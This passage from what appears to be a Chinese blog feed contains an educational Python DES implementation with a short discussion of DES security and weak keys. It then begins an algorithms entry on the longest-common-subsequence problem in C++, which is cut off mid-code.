data[e_box[i]]</span><br><span class="line">	<span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥加处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_plus</span><span class="params">(data, key)</span>:</span></span><br><span class="line">	out = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">		out += str(int(data[i])^int(key[i]))</span><br><span class="line">	<span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># s盒置换，输入48位，输出32位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">	s1 = [[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>],</span><br><span class="line">		[<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>],</span><br><span class="line">		[<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>],</span><br><span class="line">		[<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>]]</span><br><span class="line">	s2 = [[<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">		[<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>],</span><br><span class="line">		[<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>],</span><br><span class="line">		[<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>]]</span><br><span class="line">	s3 = [[<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>],</span><br><span class="line">		[<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>],</span><br><span class="line">		[<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>],</span><br><span class="line">		[<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>]]</span><br><span class="line">	s4 = [[<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>],</span><br><span class="line">		[<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">		[<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>],</span><br><span class="line">		[<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>]]</span><br><span class="line">	s5 = [[<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">		[<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>],</span><br><span class="line">		[<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>],</span><br><span class="line">		[<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>]]</span><br><span class="line">	s6 = [[<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>],</span><br><span class="line">		[<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>],</span><br><span class="line">		[<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>],</span><br><span class="line">		[<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>]]</span><br><span class="line">	s7 = [[<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>],</span><br><span class="line">		[<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>],</span><br><span class="line">		[<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>],</span><br><span class="line">		[<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>]]</span><br><span class="line">	s8 = [[<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>],</span><br><span class="line">		[<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>],</span><br><span class="line">		[<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>],</span><br><span class="line">		[<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line">	re = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>//<span class="number">6</span>):</span><br><span class="line">	    re.append(data[<span class="number">6</span>*i:<span class="number">6</span>*i+<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 开始进行s盒置换</span></span><br><span class="line">	dic = [s1,s2,s3,s4,s5,s6,s7,s8]</span><br><span class="line">	retn = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">		r = int(re[i][<span class="number">0</span>] + re[i][<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">		c = int(re[i][<span class="number">1</span>:<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">		temp = str(bin(dic[i][r][c]))[<span class="number">2</span>:]</span><br><span class="line">		temp = <span class="string">"0"</span>*(<span class="number">4</span>-len(temp)) + temp</span><br><span class="line">		retn += temp</span><br><span class="line">	<span class="comment"># print(len(retn))</span></span><br><span class="line">	<span class="keyword">return</span> retn</span><br><span class="line"></span><br><span class="line"><span class="comment"># p盒置换，输入输出均为32位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">	p = [<span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, </span><br><span class="line">		<span class="number">23</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">24</span>]</span><br><span class="line">	re = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">		re  += data[p[i]]</span><br><span class="line">	<span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># F函数，32位数据，子秘钥，轮数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_function</span><span class="params">(data, key, round)</span>:</span></span><br><span class="line">	cipher = data   <span class="comment"># 左侧32位</span></span><br><span class="line">	cipher = e_replace(cipher)</span><br><span class="line">	cipher = secret_plus(cipher, key)</span><br><span class="line">	cipher = s_replace(cipher)</span><br><span class="line">	cipher = p_replace(cipher)</span><br><span class="line">	<span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_key_bin</span><span class="params">(key)</span>:</span></span><br><span class="line">	word = key</span><br><span class="line">	key = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> word:</span><br><span class="line">		key += <span class="string">f'<span class="subst">&#123;bin(ord(i))[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">8</span>&#125;</span>'</span></span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 终极加密函数，参数为秘钥和明文(明文暂时测试为64位以内)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt</span><span class="params">(ptext, key)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">		l[i] = <span class="string">""</span></span><br><span class="line">		r[i] = <span class="string">""</span></span><br><span class="line">	key = convert_key_bin(key)</span><br><span class="line">	cipher = init_replace(ptext)</span><br><span class="line">	l[<span class="number">0</span>] = cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">	r[<span class="number">0</span>] = cipher[<span class="number">32</span>:]</span><br><span class="line">	<span class="comment"># 进行16层循环</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">		l[i] = r[i<span class="number">-1</span>]</span><br><span class="line">		secret_key = generate_secretkey(key,i) <span class="comment"># 生成子秘钥</span></span><br><span class="line">		f_result = f_function(r[i<span class="number">-1</span>],secret_key,i)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">			r[i] += str(int(l[i<span class="number">-1</span>][j])^int(f_result[j]))</span><br><span class="line">	secret_key = generate_secretkey(key,<span class="number">16</span>)</span><br><span class="line">	f_result = f_function(r[<span class="number">15</span>],secret_key,<span class="number">16</span>)</span><br><span class="line">	l[<span class="number">16</span>] = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">		l[<span class="number">16</span>] += str(int(l[<span class="number">15</span>][j])^int(f_result[j]))</span><br><span class="line">	r[<span class="number">16</span>] = r[<span class="number">15</span>]</span><br><span class="line">	temp = l[<span class="number">16</span>] + r[<span class="number">16</span>]</span><br><span class="line">	final_cipher = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">		final_cipher += temp[_ip[i]]</span><br><span class="line">	<span class="keyword">return</span> <span class="string">f'<span class="subst">&#123;hex(int(final_cipher,<span class="number">2</span>))[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">16</span>&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_decrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">		l[i] = <span class="string">""</span></span><br><span class="line">		r[i] = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 恢复为64位密文</span></span><br><span class="line">	key = convert_key_bin(key)</span><br><span class="line">	temp = bin(int(cipher, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">	cipher = <span class="string">"0"</span>*(<span class="number">64</span>-len(temp)) + temp</span><br><span class="line">	cipher = init_replace(cipher)</span><br><span class="line">	l[<span class="number">16</span>] = cipher[:<span class="number">32</span>]</span><br><span class="line">	r[<span class="number">16</span>] = cipher[<span class="number">32</span>:]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">		l[i<span class="number">-1</span>] = r[i]</span><br><span class="line">		secret_key = generate_secretkey(key,i) <span class="comment"># 生成子秘钥</span></span><br><span class="line">		f_result = f_function(r[i],secret_key,i)</span><br><span class="line">		r[i<span class="number">-1</span>] = <span class="string">""</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">			r[i<span class="number">-1</span>] += str(int(l[i][j])^int(f_result[j]))</span><br><span class="line">	r[<span class="number">0</span>] = r[<span class="number">1</span>]</span><br><span class="line">	secret_key = generate_secretkey(key,<span class="number">1</span>)</span><br><span class="line">	l[<span class="number">0</span>] = <span class="string">""</span></span><br><span class="line">	f_result = f_function(r[<span class="number">1</span>],secret_key,<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">		l[<span class="number">0</span>] += str(int(l[<span class="number">1</span>][j])^int(f_result[j]))</span><br><span class="line">	temp = l[<span class="number">0</span>] + r[<span class="number">0</span>]</span><br><span class="line">	bintext = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">		bintext += temp[_ip[i]]</span><br><span class="line">	plaintext = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">		plaintext += chr(int(bintext[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">	<span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(text)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> len(text) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">		text = text + <span class="string">" "</span>*(<span class="number">8</span>-(len(text)%<span class="number">8</span>))</span><br><span class="line">	binplain = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">		binplain += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line">	<span class="keyword">return</span> binplain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">	longbinplain = str2bin(text)</span><br><span class="line">	group_plain = <span class="string">""</span></span><br><span class="line">	longcipher = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(longbinplain)//<span class="number">64</span>):</span><br><span class="line">		group_plain = <span class="string">""</span></span><br><span class="line">		group_plain = longbinplain[<span class="number">64</span>*i:<span class="number">64</span>*i+<span class="number">64</span>]</span><br><span class="line">		longcipher += des_encrypt(group_plain,key)</span><br><span class="line">	<span class="keyword">return</span> longcipher	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">	plaintext = <span class="string">""</span>	</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)//<span class="number">16</span>):</span><br><span class="line">		plaintext += des_decrypt(cipher[<span class="number">16</span>*i:<span class="number">16</span>*i+<span class="number">16</span>], key)</span><br><span class="line">	<span class="keyword">return</span> plaintext.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	mode =  sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">while</span> mode <span class="keyword">in</span> (<span class="string">"e"</span>,<span class="string">"d"</span>):</span><br><span class="line">		data = input(<span class="string">"Plz input data: "</span>)</span><br><span class="line">		key = str(input(<span class="string">"Plz input key: "</span>))</span><br><span class="line">		<span class="keyword">if</span> mode == <span class="string">"e"</span>:</span><br><span class="line">			ans = encrypt(data, key)</span><br><span class="line">			print(ans)</span><br><span class="line">		<span class="keyword">elif</span> mode == <span class="string">"d"</span>:</span><br><span class="line">			ans = decrypt(data, key)</span><br><span class="line">			print(ans)</span><br><span class="line">		mode = input(<span class="string">"quit or continue?\n"</span>)</span><br></pre></td></tr></table></figure>
<p>为了增强通用性，增加代码重用性，该算法使用了包封装，从而使其能够被其它程序重用。该DES支持短信息加密，也支持长消息加密。为了使密文便于显示和存储转化为16进制显示</p>
<p><em>实例演示：</em></p>
<p><img src="crypto1/4.png" alt="demo"></p>
<p><em>安全性分析</em></p>
<p>​    DES算法具有极高的安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。 而56位长的密钥的穷举空间为2^56，这意味着如果一台计算机的速度是每一秒钟检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的。然而，这并不等于说DES是不可破解的。而实际上，随着硬件技术和Internet的发展，其破解的可能性越来越大，而且，所需要的时间越来越少。使用经过特殊设计的硬件并行处理要几个小时。</p>
<p>​    由DES算法的密钥生成步骤中我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、……64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，……64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，……64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，….. .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。</p>
<p>​    此外，由于DES算法各轮（F函数）的子密钥是通过改变初始密钥这种方式得到的，因此有些初始密钥成了弱密钥（weakkey）。初始密钥分成两部分，每部分各自独立的移动。如果每一部分的所有位都是0或1，那么算法的任意一个周期的密钥都是相同的。当密钥是全1、全0、或者一半全1、一半全0时，会发生这种情况。所以<em>我们在选择密钥时要进行检查，以防止产生弱密钥</em>。</p>
<p>​    随着密码学的发展，差分分析和线性分析的发展对分组密码的安全性构成了挑战，也推动了分组密码设计技术的发展。</p>
<p>​    随着计算机计算能力的提高与密码分析技术的进步，DES的密钥长度已经被证明不能够满足当前安全性能的需求，为了克服DES密钥空间小的缺陷，人们又提出了三重DES的变形形式，即使用多个不同的DES秘钥利用DES算法对明文进行多次加密，这样可以增加密钥量。</p>
<p><em>算法实用性分析</em></p>
<p>​    DES算法拥有着良好的安全性，目前最有效的破解方法依然是穷举攻击，所以在一些安全性要求相对不高的情况下可以使用DES算法，此外，由于DES的广泛的使用量，为了充分利用有关DES的软硬件资源，可以使用DES的改进算法如三重DES算法等。</p>
<p>​    由于DES算法要进行多轮迭代，所以DES的运算速度相对较慢，此外，密码生命周期也比较短。</p>
<hr>
<p>​    分组密码与序列密码相比，具有扩散性好，插入敏感等优点，缺点是加解密处理速度慢、存在错误传播。用途上，在对于处理数据分组的应用，比如文件传递、电子邮件，分组密码非常合适。 </p>
]]></content>
      
        <categories>
            
            <category> Record </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[简单算法记录]]></title>
      <url>/2019/01/01/suanfa/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下</p>
<a id="more"></a>
<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><blockquote>
<p>题目描述<br>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=<a,b,f,c>是序列X=<a,b,c,f,b,c>的一个子序列，Z中的元素在X中的下标序列为<1,2,4,6>。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</1,2,4,6></a,b,c,f,b,c></a,b,f,c></p>
<p>输入<br>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p>
<p>输出<br>对于每组输入，输出两个字符串的最长公共子序列的长度。</p>
</blockquote>
<p>最长公共子序列问题，递推公式为</p>
<p><img src="suanfa/1.png" alt=""></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> x;</span><br><span class="line"><span class="built_in">string</span> y;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">105</span>][<span class="number">105</span>],c[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCSLength</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++) c[i][<span 